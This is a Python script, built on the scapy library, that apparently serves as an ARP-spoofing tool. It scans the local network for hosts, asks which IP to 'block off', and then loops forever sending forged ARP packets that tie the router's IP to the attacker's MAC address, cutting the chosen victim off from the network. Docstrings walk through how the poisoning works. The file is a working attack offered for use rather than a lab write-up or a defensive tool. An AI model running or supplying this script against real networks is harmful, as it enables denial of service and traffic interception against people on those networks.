import socket
import scapy.all as scapy


def get_gateway_ip():
    """
    scapy.sr1 will send and listen to only one answer
    """
    test = scapy.sr1(scapy.IP(dst="google.com", ttl=0))
    return test.src


def get_attacker_mac():
    print(scapy.get_if_hwaddr(scapy.conf.iface))
    return scapy.get_if_hwaddr(scapy.conf.iface)


def scan():
    """
    This function scans the network for active clients and their IP addresses.
    The ARP request does the thing for us, sending ARP request all the available IPs and waiting for response with their MAC's
    The ARP packet has hwsrc and psrc preconfigured for now.
    But pdst should be the range of IP's
    ff:ff:ff:ff:ff:ff is used in order to send it on all devices on network
    So our packet is going to all IP's asking if they are active send their MAC.
    You can see more via the packet.show() command to see all fields.
    """
    arp_req = scapy.ARP()
    arp_req.pdst = str(get_gateway_ip()) + "/24"
    print(arp_req.pdst)

    ip_and_macs = {}

    broadcast = scapy.Ether()
    broadcast.dst = "ff:ff:ff:ff:ff:ff"

    final_packet = broadcast / arp_req

    clients = scapy.srp(final_packet, timeout=10)[0]
    for client in clients:
        print(client[1].psrc, client[1].hwsrc)
        ip_and_macs[str(client[1].psrc)] = str(client[1].hwsrc)
    return ip_and_macs


def cancel():
    """
    Send the ARP packet as the destination IP and MAC to be victims IP and MAC.
    And to fool the victim into thinking the packet is comming from the router
    You have to add the source as your routers IP but the MAC address as yours address
    Ether layer will have the actual source and destination to where the ARP packet will travel to.
    That is from your address to victims address.
    As this is in a foreever loop
    Upon receiving the ARP request the victim's ARP Cache will keep on updating the routers IP with your MAC
    So all the packets that are supposed to be delivered to routers IP, when looking up for the physical address it will find attackers physical Address.
    """
    clients = scan()
    gateway_ip = get_gateway_ip()
    attackers_mac = get_attacker_mac()
    option = input("Which IP to block off\t")
    print(clients[option])

    while True:
        arp_req = scapy.ARP()
        arp_req.pdst = option
        arp_req.hwdst = clients[option]
        arp_req.psrc = gateway_ip
        arp_req.hwsrc = attackers_mac

        ether = scapy.Ether()
        ether.src = attackers_mac
        ether.dst = clients[option]

        final_packet = ether / arp_req
        scapy.sendp(final_packet)


cancel()
